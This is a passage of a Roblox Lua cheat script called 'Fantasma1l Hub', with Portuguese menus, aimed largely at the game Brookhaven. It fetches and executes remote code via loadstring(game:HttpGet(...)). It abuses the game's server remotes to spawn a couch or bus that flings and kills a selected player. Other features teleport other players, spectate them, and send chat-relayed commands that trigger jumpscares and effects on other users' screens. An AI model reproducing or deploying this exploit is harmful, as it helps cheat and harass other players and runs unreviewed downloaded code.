        if REQUIRE_WHITELIST and senderName ~= LocalPlayer.Name and not WHITELIST[senderName] then return end
    end

    if FXNET.actions[action] then
        if target then
            task.spawn(function() pcall(executeActionLocally, action, senderName, target) end)
        end
        return
    end

    if action == "KAMUI" or action == "COOLKID_EFFECT" then
        if target == "ALL" or target == LocalPlayer.Name or senderName == LocalPlayer.Name or target == selectedPlayerName then
            task.spawn(function() pcall(function() executeActionLocally(action, senderName, target or extraArg) end) end)
        end
    else
        if target and (string.upper(target) == "ALL" or isMe(target)) then
            task.spawn(function() pcall(function() executeActionLocally(action, senderName, extraArg) end) end)
        end
    end
end

for _, p in pairs(Players:GetPlayers()) do
    p.Chatted:Connect(function(msg) processNetMessage(msg, p.Name) end)
end
Players.PlayerAdded:Connect(function(p)
    p.Chatted:Connect(function(msg) processNetMessage(msg, p.Name) end)
end)

task.spawn(function()
    pcall(function()
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local tc = TextChatService:WaitForChild("TextChannels", 3)
            if tc then
                local g = tc:WaitForChild("RBXGeneral", 3)
                if g then
                    g.MessageReceived:Connect(function(tcm)
                        if tcm.TextSource then
                            local s = Players:GetPlayerByUserId(tcm.TextSource.UserId)
                            if s then processNetMessage(tcm.Text, s.Name) end
                        end
                    end)
                end
            end
        end
    end)
    task.wait(1)
    sendNetCmd(";PING ALL")
end)

-- ================== ADM HUB ==================
if IS_ADMIN then

local function toggleFlyWithWings()
    flyWingsActive = not flyWingsActive
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local torso = char and (char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso"))
    local head = char and char:FindFirstChild("Head")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not char or not hrp or not torso or not head then return end

    if flyWingsActive then
        local ok, w = pcall(function() return game:GetObjects("rbxassetid://" .. WINGS_ID) end)
        if ok and w and #w > 0 then
            wingsModel = w[1]
            if not wingsModel:IsA("Model") then
                local m = Instance.new("Model")
                for _, o in ipairs(w) do o.Parent = m end
                wingsModel = m
            end
            wingsModel.Parent = char
            for _, p in ipairs(wingsModel:GetDescendants()) do
                if p:IsA("BasePart") then p.Anchored, p.CanCollide = false, false end
            end
            local pr = wingsModel.PrimaryPart or wingsModel:FindFirstChildWhichIsA("BasePart", true)
            if pr then
                wingsModel.PrimaryPart = pr
                local wc = Instance.new("WeldConstraint")
                wc.Part0, wc.Part1, wc.Parent = torso, pr, pr
            end
        end
        local function loadHalo(id)
            local s, o = pcall(function() return game:GetObjects("rbxassetid://" .. id) end)
            if s and o and #o > 0 then
                local h = o[1]
                if not h:IsA("Model") then
                    local m = Instance.new("Model")
                    for _, x in ipairs(o) do x.Parent = m end
                    h = m
                end
                h.Parent = char
                for _, p in ipairs(h:GetDescendants()) do
                    if p:IsA("BasePart") then p.Anchored, p.CanCollide = false, false end
                end
                local pr = h.PrimaryPart or h:FindFirstChildWhichIsA("BasePart", true)
                if pr then
                    h.PrimaryPart = pr
                    local wc = Instance.new("WeldConstraint")
                    wc.Part0, wc.Part1, wc.Parent = head, pr, pr
                end
                return h
            end
        end
        halo1Model = loadHalo(HALO1_ID)
        halo2Model = loadHalo(HALO2_ID)
        local bv = Instance.new("BodyVelocity", hrp)
        bv.Name, bv.MaxForce, bv.Velocity = "FlyVelocity", Vector3.new(1e9,1e9,1e9), Vector3.zero
        local bg = Instance.new("BodyGyro", hrp)
        bg.Name, bg.MaxTorque, bg.CFrame = "FlyGyro", Vector3.new(1e9,1e9,1e9), hrp.CFrame
        if hum then hum.PlatformStand = true end
        local an = hum and hum:FindFirstChild("Animator")
        local ia = Instance.new("Animation") ia.AnimationId = FLY_IDLE
        local ma = Instance.new("Animation") ma.AnimationId = FLY_MOVE
        local it = an and an:LoadAnimation(ia)
        local mt = an and an:LoadAnimation(ma)
        if it then it:Play() end
        local lastM, cam = false, workspace.CurrentCamera
        local wt, ht = 0, 0
        flyConnections.RS = RunService.RenderStepped:Connect(function(dt)
            if not hrp or not hrp.Parent then return end
            local dir = Vector3.zero
            local ccf = cam.CFrame
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir = dir + ccf.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir = dir - ccf.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then dir = dir - ccf.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir = dir + ccf.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then dir = dir + Vector3.new(0,1,0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then dir = dir - Vector3.new(0,1,0) end
            if hum and hum.MoveDirection.Magnitude > 0 then dir = dir + hum.MoveDirection end
            if dir.Magnitude > 0 then
                bv.Velocity = dir.Unit * 55
                if not lastM then
                    lastM = true
                    if it then it:Stop() end
                    if mt and not mt.IsPlaying then mt:Play() end
                end
            else
                bv.Velocity = Vector3.zero
                if lastM then
                    lastM = false
                    if mt then mt:Stop() end
                    if it and not it.IsPlaying then it:Play() end
                end
            end
            bg.CFrame = ccf
            wt = wt + dt * 5
            if wingsModel and wingsModel.PrimaryPart then
                wingsModel:SetPrimaryPartCFrame(torso.CFrame * CFrame.new(0,-0.2,0.6) * CFrame.Angles(0, math.pi, math.sin(wt)*0.15))
            end
            ht = ht + dt
            local r = tick() * 3.5
            if halo1Model and halo1Model.PrimaryPart then
                halo1Model:SetPrimaryPartCFrame(head.CFrame * CFrame.new(0,1.3,0) * CFrame.Angles(0, r, 0))
            end
            if halo2Model and halo2Model.PrimaryPart then
                halo2Model:SetPrimaryPartCFrame(head.CFrame * CFrame.new(0,1.3,0) * CFrame.Angles(0, -r, 0))
            end
            local t = math.floor(ht * 2) % 2 == 0 and 0 or 1
            if halo1Model then for _, p in ipairs(halo1Model:GetDescendants()) do if p:IsA("BasePart") then p.Transparency = t end end end
            if halo2Model then for _, p in ipairs(halo2Model:GetDescendants()) do if p:IsA("BasePart") then p.Transparency = 1 - t end end end
        end)
    else
        for _, c in pairs(flyConnections) do c:Disconnect() end
        flyConnections = {}
        if wingsModel then wingsModel:Destroy() wingsModel = nil end
        if halo1Model then halo1Model:Destroy() halo1Model = nil end
        if halo2Model then halo2Model:Destroy() halo2Model = nil end
        if hrp then
            if hrp:FindFirstChild("FlyVelocity") then hrp.FlyVelocity:Destroy() end
            if hrp:FindFirstChild("FlyGyro") then hrp.FlyGyro:Destroy() end
        end
        if hum then hum.PlatformStand = false end
    end
end

local function spawnSkyline(targetName)
    local tp = Players:FindFirstChild(targetName)
    if not tp or not tp.Character then notify("ADM", "Alvo inválido!") return end
    local th = tp.Character:FindFirstChild("HumanoidRootPart")
    if not th then return end
    task.spawn(function()
        notify("ADM", "Skyline → " .. targetName)
        local ok, objs = pcall(function() return game:GetObjects("rbxassetid://" .. SKYLINE_MODEL_ID) end)
        if not (ok and objs and #objs > 0) then return end
        local car = objs[1]
        if not car:IsA("Model") then
            local m = Instance.new("Model")
            for _, o in ipairs(objs) do o.Parent = m end
            car = m
        end
        if not car.PrimaryPart then car.PrimaryPart = car:FindFirstChildWhichIsA("BasePart", true) end
        car.Parent = workspace
        pcall(function() car:ScaleTo(0.35) end)
        for _, p in ipairs(car:GetDescendants()) do
            if p:IsA("BasePart") then p.Anchored, p.CanCollide = true, false end
        end
        local sp = th.Position + th.CFrame.LookVector * 45
        local rp = RaycastParams.new()
        rp.FilterType, rp.FilterDescendantsInstances = Enum.RaycastFilterType.Exclude, {car, tp.Character}
        local rr = workspace:Raycast(sp + Vector3.new(0, 50, 0), Vector3.new(0, -100, 0), rp)
        local gy = rr and rr.Position.Y or sp.Y
        local bcf, bs = car:GetBoundingBox()
        local bo = car:GetPivot().Position.Y - (bcf.Position.Y - bs.Y / 2)
        local tcf = CFrame.new(sp.X, gy + bo, sp.Z) * CFrame.lookAt(sp, th.Position).Rotation
        local scf = tcf * CFrame.new(0, -10, 0)
        car:PivotTo(scf)
        for i = 1, 35 do
            car:PivotTo(scf:Lerp(tcf, (i / 35) ^ 2 * (3 - 2 * (i / 35))))
            task.wait(0.015)
        end
        car:PivotTo(tcf)
        task.wait(0.15)
        local st, dur, hit = tick(), 10, false
        while tick() - st < dur and car and car.Parent do
            if tp and tp.Character then
                local cth = tp.Character:FindFirstChild("HumanoidRootPart")
                local ch = tp.Character:FindFirstChildOfClass("Humanoid")
                if cth then
                    local ccf = car:GetPivot()
                    local cr = workspace:Raycast(cth.Position + Vector3.new(0,20,0), Vector3.new(0,-40,0), rp)
                    local cgy = cr and cr.Position.Y or cth.Position.Y
                    local tpos = Vector3.new(cth.Position.X, cgy + bo, cth.Position.Z)
                    local d = tpos - ccf.Position
                    if d.Magnitude > 2 then car:PivotTo(CFrame.new(ccf.Position + d.Unit * 3.75, tpos)) end
                    if (ccf.Position - cth.Position).Magnitude <= 7 and not hit then
                        hit = true
                        if ch then ch.Health = 0 end
                        Instance.new("Explosion", workspace).Position = cth.Position
                    end
                end
            else break end
            task.wait(0.03)
        end
        task.wait(0.4)
        if car then car:Destroy() end
    end)
end

local function toggleAura()
    local char = LocalPlayer.Character
    if not char then return end
    if auraTrack then auraTrack:Stop() auraTrack = nil notify("Aura", "Off")
    else
        auraTrack = safePlayAnimation(char, AURA_ANIM_ID)
        if auraTrack then auraTrack.Looped = true notify("Aura", "On") end
    end
end

local function giveGojo()
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not char or not hrp then return end
    local t = Instance.new("Tool")
    t.Name, t.RequiresHandle = "Vazio Roxo", false
    t.Parent = LocalPlayer:FindFirstChild("Backpack") or char
    t.Activated:Connect(function()
        safePlayAnimation(char, CUSTOM_ANIM_ID)
        task.spawn(function()
            local p = fetchAssetAsModel("14819645681")
            if p and p.PrimaryPart then
                pcall(function() p:ScaleTo(300) end)
                for _, x in ipairs(p:GetDescendants()) do
                    if x:IsA("BasePart") then x.Anchored, x.CanCollide = true, false end
                end
                p:PivotTo(hrp.CFrame * CFrame.new(0, 2, -20))
                p.Parent = workspace
                local dir = hrp.CFrame.LookVector
                local cn
                cn = RunService.RenderStepped:Connect(function(dt)
                    if p and p.Parent then p:PivotTo(p:GetPivot() + dir * 150 * dt)
                    else cn:Disconnect() end
                end)
                task.delay(4, function() if cn then cn:Disconnect() end if p then p:Destroy() end end)
            end
        end)
    end)
    notify("Gojo", "Ativado!")
end

local function triggerCommand(action, target, extraArg)
    if not target or target == "" then return end
    if target == LocalPlayer.Name or target == "ALL" then
        executeActionLocally(action, LocalPlayer.Name, extraArg)
    end
    local cmd = ";" .. action .. " " .. target
    if extraArg then cmd = cmd .. " " .. extraArg end
    sendNetCmd(cmd)
    notify("ADM", action .. " → " .. target)
end

local function getPlayerNames()
    local n = {}
    for _, p in pairs(Players:GetPlayers()) do table.insert(n, p.Name) end
    return n
end

    TabJ:Dropdown({ Title = "Alvo", Values = getPlayerNames(),

    TabJ:Button({ Title = "Jumpscare 1", Callback = function() triggerCommand("JUMPSCARE_1", selectedPlayerName) end })
    TabJ:Button({ Title = "Jumpscare 2", Callback = function() triggerCommand("JUMPSCARE_2", selectedPlayerName) end })
    TabJ:Button({ Title = "Jumpscare 3", Callback = function() triggerCommand("JUMPSCARE_3", selectedPlayerName) end })

    local TabE = Window:Tab({ Title = "Funções Essenciais", Icon = ICON_ID })
    TabE:Button({ Title = "Fly com Asas e Dois Halos", Callback = function() toggleFlyWithWings() end })
    TabE:Button({ Title = "Ativar/Desativar Aura", Callback = function() toggleAura() end })
    -- Locust em um só: aperta uma vez liga, aperta de novo desliga (vale pra rede toda do hub)
    local function toggleLocust(target)
        if not target or target == "" then return end
        local isOn
        if target == "ALL" then
            isOn = next(LOCUST.users) ~= nil
        elseif target == LocalPlayer.Name then
            isOn = LOCUST.running or LOCUST.busy
        else
            isOn = LOCUST.users[target] == true
        end
        triggerCommand(isOn and "LOCUST_OFF" or "LOCUST_ON", target)
    end
    TabE:Button({ Title = "Locust (Eu)",     Callback = function() toggleLocust(LocalPlayer.Name) end })
    TabE:Button({ Title = "Locust (Alvo)",   Callback = function() toggleLocust(selectedPlayerName) end })
    TabE:Button({ Title = "Locust (Todos)",  Callback = function() toggleLocust("ALL") end })
    TabE:Button({ Title = "Locust: diagnóstico dos acessórios", Callback = function() LOCUST.diag() end })

    -- Xester (The Card Master) em rede: aperta uma vez liga, de novo desliga
    local function toggleXester(target)
        if not target or target == "" then return end
        local isOn
        if target == "ALL" then
            isOn = next(XESTER.users) ~= nil
        elseif target == LocalPlayer.Name then
            isOn = XESTER.running
        else
            isOn = XESTER.users[target] == true
        end
        triggerCommand(isOn and "XESTER_OFF" or "XESTER_ON", target)
    end
    TabE:Button({ Title = "Xester (Eu)",     Callback = function() toggleXester(LocalPlayer.Name) end })
    TabE:Button({ Title = "Xester (Alvo)",   Callback = function() toggleXester(selectedPlayerName) end })
    TabE:Button({ Title = "Xester (Todos)",  Callback = function() toggleXester("ALL") end })

    -- Roube um Brainrot: o mundo é gerado nas mesmas coordenadas pra todo mundo (se vêem lá dentro)
    TabE:Button({ Title = "Roube um Brainrot (Eu e Alvo)", Callback = function()
        task.spawn(function() pcall(roubeUmBrainrot, "ON") end)
        if selectedPlayerName ~= LocalPlayer.Name then sendNetCmd(";BRAINROT_SPAWN " .. selectedPlayerName) end
        notify("ADM", "BRAINROT → " .. selectedPlayerName)
    end })
    TabE:Button({ Title = "Roube um Brainrot (Todos)", Callback = function() triggerCommand("BRAINROT_SPAWN", "ALL") end })
    TabE:Button({ Title = "Roube um Brainrot (Limpar)", Callback = function()
        task.spawn(function() pcall(roubeUmBrainrot, "OFF") end)
        sendNetCmd(";BRAINROT_CLEAR ALL")
    end })
    TabE:Button({ Title = "Modo Satoru Gojo", Callback = function() giveGojo() end })
    TabE:Button({ Title = "Expansão de Domínio [Sukuna]", Callback = function() triggerCommand("SUKUNA_DOMAIN", "ALL") end })
    TabE:Button({ Title = "Pegar AK-47", Callback = function() giveAK47() end })
    TabE:Button({ Title = "Equipar Yoru", Callback = function() giveYoru() end })
    TabE:Button({ Title = "Chuva de Tacos (Server)", Callback = function() triggerCommand("TACO_RAIN", "ALL") end })
    TabE:Button({ Title = "Chuva do Renegado (Server)", Callback = function() triggerCommand("RENEGADO_RAIN", "ALL") end })
    TabE:Button({ Title = "Meme na cara 1", Callback = function() triggerCommand("MEME_FACE", "ALL", "MEME1") end })
    TabE:Button({ Title = "Meme na cara 2", Callback = function() triggerCommand("MEME_FACE", "ALL", "MEME2") end })
    TabE:Button({ Title = "Meme na cara 3", Callback = function() triggerCommand("MEME_FACE", "ALL", "MEME3") end })
    TabE:Button({ Title = "Meme na cara 4", Callback = function() triggerCommand("MEME_FACE", "ALL", "MEME4") end })
    TabE:Button({ Title = "Meme na cara 5", Callback = function() triggerCommand("MEME_FACE", "ALL", "MEME5") end })

    -- >>> FLASH & AURA (REDE): aperta uma vez liga, aperta de novo desliga <<<
    local function toggleFX(kind) -- kind = "FLASH" ou "AURA"
        local stateTable = (kind == "FLASH") and FXNET.flash or FXNET.aura
        local isOn = stateTable[LocalPlayer.Name] ~= nil
        FXNET.send(kind .. (isOn and "_OFF" or "_ON"), LocalPlayer.Name)
    end
    TabE:Button({ Title = "Flash (ligar/desligar)",        Callback = function() toggleFX("FLASH") end })
    TabE:Button({ Title = "Aura Dourada (ligar/desligar)", Callback = function() toggleFX("AURA") end })
end

end -- fim IS_ADMIN

-- ================== BROOKHAVEN ==================
task.spawn(function()
    local ok, redz = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/minhdepzai-v/LibraryRobloc/refs/heads/main/RedzLibrary.lua"))()
    end)
    if not (ok and redz) then return end

    local Window = redz:MakeWindow({
        Title = "Fantasma1l Hub [" .. MY_ROLE .. "]",
        SubTitle = "Brookhaven Edition",
        SaveFolder = "Fantasma1l_Brookhaven"
    })
    Window:AddMinimizeButton({
        Button = { Image = ICON_ID, BackgroundTransparency = 0 },
        Corner = { CornerRadius = UDim.new(35, 1) },
    })

    local TabHome = Window:MakeTab({ "Início", "home" })
    local TabTroll = Window:MakeTab({ "Troll & Ações", "user" })
    local TabAudio = Window:MakeTab({ "Áudio", "music" })
    Window:SelectTab(TabHome)

    TabHome:AddSection({ "Informações" })
    TabHome:AddParagraph({ "Bem-vindo", "Cargo: " .. MY_ROLE })
    TabHome:AddButton({ "Rejoin Server", function()
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
    end })

    TabTroll:AddSection({ "Troll Player" })
    local selectedPlayerNameBH = nil
    getgenv().Target = nil
    local function listPlayers()
        local names = {}
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LocalPlayer then table.insert(names, p.Name) end
        end
        if #names == 0 then table.insert(names, "Ninguém") end
        return names
    end
    local dd = TabTroll:AddDropdown({ Name = "Selecionar Jogador", Options = listPlayers(), Default = "",
        Callback = function(v) selectedPlayerNameBH = v getgenv().Target = v end })
    TabTroll:AddButton({ "Atualizar Lista", function() dd:Set(listPlayers()) end })
    TabTroll:AddButton({ "Teleportar até Player", function()
        if not selectedPlayerNameBH then return end
        local tp = Players:FindFirstChild(selectedPlayerNameBH)
        local chr = LocalPlayer.Character
        local h = chr and chr:FindFirstChild("HumanoidRootPart")
        if tp and tp.Character and tp.Character:FindFirstChild("HumanoidRootPart") and h then
            h.CFrame = tp.Character.HumanoidRootPart.CFrame
        end
    end })
    local specConn
    TabTroll:AddToggle({ Name = "Spectar Player", Default = false, Callback = function(v)
        if specConn then specConn:Disconnect() specConn = nil end
        if v then
            specConn = RunService.Heartbeat:Connect(function()
                local tp = Players:FindFirstChild(selectedPlayerNameBH)
                if tp and tp.Character then
                    local h = tp.Character:FindFirstChildOfClass("Humanoid")
                    if h then workspace.CurrentCamera.CameraSubject = h end
                end
            end)
        else
            local chr = LocalPlayer.Character
            local h = chr and chr:FindFirstChildOfClass("Humanoid")
            if h then workspace.CurrentCamera.CameraSubject = h end
        end
    end })
    TabTroll:AddSection({ "Métodos" })
    local methodKill = "Couch"
    TabTroll:AddDropdown({ Name = "Método", Options = { "Bus", "Couch", "Couch BETA" }, Default = "Couch",
        Callback = function(v) methodKill = v end })

    -- ===== COUCH (CORRIGIDO) =====
    -- Procura o sofá no Backpack E no Character, por nome parecido
    local function findCouch()
        local chr = LocalPlayer.Character
        for _, c in ipairs({ LocalPlayer:FindFirstChild("Backpack"), chr }) do
            if c then
                for _, t in ipairs(c:GetChildren()) do
                    if t:IsA("Tool") then
                        local n = t.Name:lower()
                        if t.Name == "Couch" or t.Name == "Chaos.Couch" or n:find("couch") or n:find("sofa") then
                            return t
                        end
                    end
                end
            end
        end
    end

    local function KillPlayerCouch()
        local targetName = getgenv().Target or selectedPlayerNameBH
        local tp = targetName and Players:FindFirstChild(targetName)
        if not tp or not tp.Character or not tp.Character:FindFirstChild("HumanoidRootPart") then
            notify("Couch", "Selecione um jogador válido.")
            return
        end

        local RE = ReplicatedStorage:FindFirstChild("RE")
        if not RE then notify("Couch", "Remote RE não encontrado.") return end

        -- limpa ferramentas e pede o sofá (com tentativas)
        pcall(function() RE:FindFirstChild("1ClearToolis"):FireServer("ClearAllTools") end)
        task.wait(0.4)

        local couch
        for _ = 1, 5 do
            pcall(function() RE:FindFirstChild("1Tool"):InvokeServer("PickingTools", "Couch") end)
            local t0 = tick()
            repeat
                couch = findCouch()
                task.wait(0.1)
            until couch or tick() - t0 > 1.5
            if couch then break end
        end
        if not couch then notify("Couch", "Sofá não encontrado.") return end

        couch.Name = "Chaos.Couch"
        local s1 = couch:FindFirstChild("Seat1") or couch:FindFirstChildWhichIsA("Seat", true)
        local s2 = couch:FindFirstChild("Seat2") or s1
        local hd = couch:FindFirstChild("Handle")
        if not s1 then notify("Couch", "Sofá sem assento.") return end
        if s1 and s2 and hd then s1.Disabled, s2.Disabled, hd.Name = true, true, "Handle " end

        couch.Parent = LocalPlayer.Character
        local bv = Instance.new("BodyVelocity", s1)
        bv.MaxForce, bv.P, bv.Velocity = Vector3.new(1e9,1e9,1e9), 1250, Vector3.zero
        bv.Name = "#MOVODEPFS#@F$GERE..>V<<<EwV<<W"

        local t0 = tick()
        repeat
            local tr = tp.Character and tp.Character:FindFirstChild("HumanoidRootPart")
            if not tr then break end
            s1.CFrame = CFrame.new(tr.Position + tr.Velocity * 0.5) * CFrame.new(-2, 2, 0)
            task.wait()
        until (tp.Character and tp.Character:FindFirstChild("Humanoid") and tp.Character.Humanoid.Sit)
            or tick() - t0 > 8

        task.wait()
        couch.Parent = LocalPlayer.Backpack
        s1.CFrame = CFrame.new(9999, -450, 9999)
        s2.CFrame = CFrame.new(9999, -450, 9999)
        couch.Parent = LocalPlayer.Character
        task.wait(0.1)
        couch.Parent = LocalPlayer.Backpack
        task.wait(2)
        local b = s1:FindFirstChild("#MOVODEPFS#@F$GERE..>V<<<EwV<<W")
        if b then b:Destroy() end
        pcall(function() RE:FindFirstChild("1ClearToolis"):FireServer("ClearAllTools") end)
    end

    local function KillPlayerBus()
        local chr = LocalPlayer.Character
        local hrp = chr and chr:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local orig = hrp.CFrame
        local function GetBus()
            local v = workspace:FindFirstChild("Vehicles")
            return v and v:FindFirstChild(LocalPlayer.Name .. "Car")
        end
        local bus = GetBus()
        if not bus then
            hrp.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
            task.wait(0.5)
            local re = ReplicatedStorage:FindFirstChild("RE")
            if re and re:FindFirstChild("1Cair") then re["1Cair"]:FireServer("PickingCar", "SchoolBus") end
            task.wait(1)
            bus = GetBus()
        end
        if bus then
            local seat = bus:FindFirstChild("Body") and bus.Body:FindFirstChild("VehicleSeat")
            if seat and chr:FindFirstChildOfClass("Humanoid") and not chr.Humanoid.Sit then
                repeat
                    hrp.CFrame = seat.CFrame * CFrame.new(0, 2, 0)
                    task.wait()
                until chr.Humanoid.Sit or not bus.Parent
            end
            local tp = Players:FindFirstChild(getgenv().Target or selectedPlayerNameBH)
            if tp and tp.Character and tp.Character:FindFirstChild("HumanoidRootPart") then
                local tr = tp.Character.HumanoidRootPart
                for _ = 1, 60 do
                    if not tp.Character or not tp.Character:FindFirstChild("HumanoidRootPart") then break end
                    local tt = tick() * 35
                    pcall(function()
                        bus:SetPrimaryPartCFrame(tr.CFrame * CFrame.new(math.sin(tt)*4, 0, math.cos(tt)*20))
                    end)
                    RunService.RenderStepped:Wait()
                end
            end
            hrp.CFrame = orig
            pcall(function() ReplicatedStorage.RE["1Cair"]:FireServer("DeleteAllVehicles") end)
        end
    end

    TabTroll:AddButton({ "Matar Player", function()
        if methodKill == "Couch" then KillPlayerCouch()
        elseif methodKill == "Couch BETA" then KillPlayerCouch()
        elseif methodKill == "Bus" then KillPlayerBus() end
    end })
    TabTroll:AddButton({ "Puxar Player", function()
        local tp = Players:FindFirstChild(selectedPlayerNameBH)
        if tp and tp.Character and tp.Character:FindFirstChild("HumanoidRootPart") then
            local chr = LocalPlayer.Character
            local h = chr and chr:FindFirstChild("HumanoidRootPart")
            if h then tp.Character.HumanoidRootPart.CFrame = h.CFrame end
        end
    end })

    TabAudio:AddSection({ "Boombox & Músicas" })
    local customAudioId = ""
    TabAudio:AddTextBox({ Name = "ID da Música", Default = "", Placeholder = "1848354536",
        Callback = function(v) customAudioId = v end })
    TabAudio:AddButton({ "Tocar no Boombox", function()
        local id = tonumber(customAudioId)
        if not id then return end
        pcall(function()
            local br = ReplicatedStorage:FindFirstChild("RE") and ReplicatedStorage.RE:FindFirstChild("1BoomBox")
            if br then br:InvokeServer(id) end
        end)
        local chr = LocalPlayer.Character
        if chr and chr:FindFirstChild("HumanoidRootPart") then
            local old = chr.HumanoidRootPart:FindFirstChild("FantasmaAudioCustom")
            if old then old:Destroy() end
            local s = Instance.new("Sound", chr.HumanoidRootPart)
            s.Name, s.SoundId = "FantasmaAudioCustom", "rbxassetid://" .. id
            s.Volume, s.Looped = 2, true
            s:Play()
        end
    end })
    TabAudio:AddButton({ "Parar Música", function()
        local chr = LocalPlayer.Character
        if chr and chr:FindFirstChild("HumanoidRootPart") then
            local s = chr.HumanoidRootPart:FindFirstChild("FantasmaAudioCustom")
            if s then s:Stop() s:Destroy() end
        end
    end })
    TabAudio:AddSection({ "Presets" })
    TabAudio:AddButton({ "Phonk", function() customAudioId = "9048303542" end })
    TabAudio:AddButton({ "Funk", function() customAudioId = "1423760883" end })

    notify("Brookhaven", "Carregado com sucesso!")
end)

-- funções disponíveis também no console: locust("ON"/"OFF"), xester("ON"/"OFF"), roubeUmBrainrot("ON"/"OFF")
pcall(function()
    local g = getgenv()
    g.locust, g.xester, g.roubeUmBrainrot = locust, xester, roubeUmBrainrot
end)

print("[Fantasma1l Hub] OK - " .. (IS_ADMIN and MY_ROLE or "Brookhaven Only"))
